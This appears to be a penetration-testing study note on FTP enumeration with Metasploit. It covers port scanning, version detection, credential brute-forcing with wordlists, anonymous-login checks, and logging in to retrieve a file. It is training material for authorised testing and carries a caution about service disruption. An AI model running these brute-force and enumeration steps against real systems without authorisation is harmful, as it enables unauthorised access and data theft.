## What is FTP?

File Transfer Protocol —> runs on **TCP port 21**, used for file sharing between servers and clients. Requires username/password authentication.

## FTP Enumeration Workflow

**Step 1 — Confirm FTP is running**

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip>
run
# Result: port 21 open
```

**Step 2 — Identify FTP version**

```bash
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target_ip>
run
# Result: ProFTPD 1.3.5a
```

Then search for known exploits for that version:

```bash
search ProFTPD
```

**Step 3 — Brute force credentials**

```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target_ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
# Result: sysadmin : 654321 (highlighted green)
```

**Step 4 — Check anonymous login**

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target_ip>
run
# Checks whether FTP allows login without credentials
```

**Step 5 — Log in and retrieve files**

```bash
ftp <target_ip>
# Username: sysadmin
# Password: 654321
ls
get secret.txt
```

## Key Points

|Module|Purpose|
|---|---|
|`ftp_version`|Identifies FTP software and version|
|`ftp_login`|Brute forces username/password combos|
|`anonymous`|Checks for unauthenticated access|

**Important caution:** Brute force attacks can overwhelm or temporarily take down a service — always account for this in a real engagement.
